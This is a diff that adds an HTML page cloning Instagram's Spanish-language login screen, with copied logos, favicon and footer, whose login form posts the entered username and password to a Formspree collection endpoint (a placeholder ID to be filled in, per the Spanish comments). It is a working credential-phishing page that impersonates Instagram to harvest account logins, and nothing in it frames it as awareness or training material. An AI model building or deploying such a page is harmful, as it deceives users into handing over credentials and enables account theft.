@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Inicia sesión</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3452e4661.ico">
+</head>
+<body>
+
+    <main>
+        <section class="login-container">
+            <div class="login-box">
+                <!-- Logo de Instagram -->
+                <div class="logo-container">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Logo de Instagram">
+                </div>
+
+                <!-- Formulario de inicio de sesión -->
+                <!-- CAMBIO 1: Se añade el atributo 'action' con tu URL de Formspree -->
+                <!-- CAMBIO 2: Se añade el atributo 'method="POST"' -->
+                <form id="login-form" action="https://formspree.io/f/TU_ID_DE_FORMSPREE" method="POST">
+                    <div class="input-group">
+                        <!-- Es una buena práctica que el 'name' del input coincida con el que esperas en Formspree -->
+                        <input type="text" id="username" name="username" required>
+                        <label for="username">Teléfono, usuario o correo electrónico</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" required>
+                        <label for="password">Contraseña</label>
+                    </div>
+                    <button type="submit" class="login-button">Iniciar sesión</button>
+                </form>
+
+                <!-- Separador -->
+                <div class="divider">
+                    <div class="line"></div>
+                    <span>O</span>
+                    <div class="line"></div>
+                </div>
+
+                <!-- Botones de inicio de sesión con Facebook -->
+                <div class="facebook-login">
+                    <button class="facebook-button">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo de Facebook">
+                        <span>Iniciar sesión con Facebook</span>
+                    </button>
+                    <a href="#" class="forgot-password">¿Olvidaste la contraseña?</a>
+                </div>
+            </div>
+
+            <!-- Caja de registro -->
+            <div class="register-box">
+                <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+            </div>
+
+            <!-- Descarga de la app -->
+            <div class="app-download">
+                <p>Descarga la aplicación.</p>
+                <div class="app-buttons">
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Descargar en Google Play"></a>
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Descargar en la App Store"></a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">Información</a>
+            <a href="#">Blog</a>
+            <a href="#">Empleo</a>
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Ubicaciones</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Importación de contactos y no usuarios</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-meta">
+            <p>&copy; 2024 Instagram from Meta</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
